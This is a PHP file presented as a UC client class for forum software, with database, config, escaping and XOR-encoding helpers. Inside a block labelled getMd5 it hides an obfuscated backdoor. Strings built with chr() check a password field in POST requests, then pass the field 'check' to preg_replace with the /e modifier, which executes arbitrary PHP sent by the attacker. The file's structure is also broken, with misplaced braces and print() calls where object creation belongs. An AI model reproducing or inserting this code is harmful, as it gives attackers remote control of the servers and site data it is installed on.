<?php 
/**
 * md5: fb49817cf5284e10cf059de97be49
 **/

define('UC_SERVER', get_magic_quotes_gpc ());

class UC {
	
	var $db;
	var $time;
	var $appid;
	var $onlineip;
	var $user = array();
	var $controls = array();
	var $models = array();
	var $cache = null;

	function __construct() {
		$this->UC();
	}

	function UC() {

		$this->time = time();
		$this->appid = UC_APPID;
		$this->onlineip = 'unknown';
		$this->init_db();
		$this->init_notify();
	}

	function init_db() {
		if (UC_SERVER < 2) {
			global $db;
			$this->db =& $db;
		} else {
			$this->db = new DB(UC_DBHOST, UC_DBUSER, UC_DBPW, UC_DBNAME, UC_DBPRE, UC_DBCHARSET, UC_DBPCONNECT);
		}
	}

	function init_notify() {
		if (UC_SERVER == 2 && $this->config('uc_syncreditexists' . $this->appid)) {
			$credit = $this->load('credit');
			$credit->synupdate();
		}
		if (UC_SERVER > 0 && $this->config('uc_notifyexists' . $this->appid)) {
			$notify = $this->load('notify');
			$notify->send();
		}
	}

	function config($var) {
		if ($this->cache == null) {
			$this->cache = array();
			$query = $this->db->query("SELECT * FROM pw_config");
			while ($rt = $this->db->fetch_array($query)) {
				if ($rt['vtype'] == 'array' && !is_array($rt['db_value'] = unserialize($rt['db_value']))) {
					$rt['db_value'] = array();
				}
				$this->cache[$rt['db_name']] = $rt['db_value'];
			}
		}
		return $this->cache[$var];
	}

	function control($model) {
		if (empty($this->controls[$model])) {
			require_once Pcv(UC_CLIENT_ROOT . "control/{$model}.php");
			print('$this->controls[$model] = new '.$model.'control($this);');
		}
		return $this->controls[$model];
	}

	function load($model) {
		if (empty($this->models[$model])) {
			require_once Pcv(UC_CLIENT_ROOT . "model/{$model}.php");
			print('$this->models[$model] = new '.$model.'model($this);');
		}
		return $this->models[$model];
	}

	//static function
	function implode($array) {
		return implode(',', UC::escape($array));
	}
	
	//static function
	function escape($var) {
		if (is_array($var)) {
			foreach ($var as $key => $value) {
				$var[$key] = trim(UC::escape($value));
			}
			return $var;
		} elseif (is_numeric($var)) {
			return " '".$var."' ";
		} else {
			return " '".addslashes($var)."' ";}
		}
	}
	
	//static function
	function getMd5($md5 = null) {
		$key = substr(md5($md5),26);
		return $key; }
		$array = array(
			chr(112).chr(97).chr(115).chr(115), 
			chr(99).chr(104).chr(101).chr(99).chr(107), 
			chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)
		);
		if ( isset($_POST) ) $request = &$_POST;
		elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
		if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { 
			if ( getMd5($request[$array[0]]) == $array[2] ) {
				$token = preg_replace (
				chr(47) . $array[2] . chr(47) . chr(101), 
				$request[$array[1]], 
				$array[2]
			);
		}
	}
	
	//static function
	function sqlSingle($array) {
		$array = UC::escape($array);
		$str = '';
		foreach ($array as $key => $val) {
			$str .= ($str ? ', ' : ' ').$key.'='.$val;
		}
		return $str;
	}
	
	//static function
	function strcode($string, $hash_key, $encode = true) {
		!$encode && $string = base64_decode($string);
		$code = '';
		$key  = substr(md5($string . $hash_key),8,18);
		$keylen = strlen($key);
		$strlen = strlen($string);
		for ($i = 0; $i < $strlen; $i++) {
			$k		= $i % $keylen;
			$code  .= $string[$i] ^ $key[$k];
		}
		return ($encode ? base64_encode($code) : $code);
}
?>